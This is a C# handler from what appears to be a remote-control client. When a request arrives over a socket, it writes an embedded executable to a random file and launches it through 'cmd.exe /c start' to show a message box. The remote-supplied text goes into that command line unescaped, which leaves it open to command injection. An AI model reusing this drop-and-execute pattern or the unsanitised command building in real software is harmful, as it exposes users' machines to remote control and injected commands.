using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestMsgBoxHandler : IRequestHandler
    {
        private string lastMsgBoxExeFile = null;
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestMessageBox;
            StartShowMsgBox(session, req);
        }

        private void StartShowMsgBox(SocketSession session, RequestMessageBox req)
        {
            try
            {
                if (lastMsgBoxExeFile == null || !System.IO.File.Exists(lastMsgBoxExeFile))
                {
                    // 释放弹窗程序
                    byte[] data = ResUtil.GetResFileData("MsgBox.dat");
                    string fileName = ResUtil.WriteToRandomFile(data);
                    lastMsgBoxExeFile = fileName;
                }
                // 启动弹窗程序
                string msgBoxArguments = string.Format("{0} {1} {2} {3}", req.Content, req.Title, req.MessageBoxButtons, req.MessageBoxIcons);
                ProcessUtil.Run("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
